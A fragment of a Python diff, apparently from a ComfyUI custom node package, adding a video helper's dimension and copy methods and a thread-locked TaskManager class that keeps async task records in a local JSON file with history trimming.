+                return 1280, 720
+            cap = cv2.VideoCapture(self.video_path)
+            if not cap.isOpened(): return 1280, 720
+            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+            cap.release()
+            return width, height
+        except Exception:
+            return 1280, 720 
+
+    def save_to(self, output_path, **kwargs):
+        if self.video_path and os.path.exists(self.video_path):
+            shutil.copyfile(self.video_path, output_path)
+            return True
+        return False
+
+# ======================================================================
+# 统一的异步任务管理器 (Task Manager)
+# ======================================================================
+class TaskManager:
+    """管理异步任务记录（JSON），内部已包含线程锁机制，防止文件读写冲突"""
+    def __init__(self, filename: str, max_completed_history: int = 15):
+        # 1. 获取当前 utils.py 所在的目录 (ComfyUI-nkxx)
+        base_dir = os.path.dirname(__file__)
+        
+        # 2. 自动创建一个专属的 data 文件夹存放所有 json 任务文件
+        self.data_dir = os.path.join(base_dir, "data")
+        os.makedirs(self.data_dir, exist_ok=True)
+        
+        # 3. 将 JSON 文件路径指向 data 文件夹内部
+        self.task_file = os.path.join(self.data_dir, filename)
+        
+        self.max_history = max_completed_history
+        self.lock = threading.Lock()
+        
+        # 常见的所有“活跃中”的状态集合
+        self.active_statuses = {"pending", "running", "processing", "SUBMITTED", "IN_PROGRESS"}
+
+    def read_tasks(self) -> dict:
+        """读取任务字典"""
+        if not os.path.exists(self.task_file): 
+            return {}
+        try:
+            with open(self.task_file, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            return data if isinstance(data, dict) else {}
+        except Exception:
+            return {}
+
+    def write_tasks(self, tasks: dict):
+        """写入任务字典（自动清理历史）"""
+        try:
+            trimmed_tasks = self._trim_history(tasks)
+            with open(self.task_file, 'w', encoding='utf-8') as f:
+                json.dump(trimmed_tasks, f, indent=4, ensure_ascii=False)
+        except Exception as e:
+            print(f"[Task Manager] 写入任务文件失败: {e}")
+
+    def update_task(self, task_id: str, updates: dict):
+        """安全地原子化更新单个任务信息"""
+        with self.lock:
+            tasks = self.read_tasks()
+            if task_id not in tasks:
+                tasks[task_id] = {}
+            tasks[task_id].update(updates)
+            self.write_tasks(tasks)
+
+    def _trim_history(self, tasks: dict) -> dict:
+        """内部方法：清理过多的已完成任务"""
+        active_tasks = {tid: t for tid, t in tasks.items() if t.get("status") in self.active_statuses}
+        completed_tasks = {tid: t for tid, t in tasks.items() if t.get("status") not in self.active_statuses}
+        
+        if len(completed_tasks) > self.max_history:
+            # 按提交时间倒序排
+            sorted_completed = sorted(completed_tasks.items(), key=lambda x: x[1].get('submitted_at', '0'), reverse=True)
+            kept_completed = dict(sorted_completed[:self.max_history])
+            return {**active_tasks, **kept_completed}
+        return tasks
